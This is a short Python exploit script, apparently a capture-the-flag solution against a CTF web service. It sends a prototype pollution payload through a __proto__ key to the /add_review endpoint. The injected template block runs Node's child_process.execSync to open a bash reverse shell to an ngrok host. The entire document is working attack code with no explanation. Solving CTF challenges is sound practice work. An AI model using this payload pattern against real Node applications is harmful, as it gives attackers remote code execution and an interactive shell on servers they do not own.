import requests

TARGET_URL = 'https://valentina.ctf.maplebacon.org'


requests.post(TARGET_URL + '/add_review', json = {
    "__proto__" : {
            "block": {
                "type": "Text", 
                "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13621 0>&1'`)"
        }
    }
})
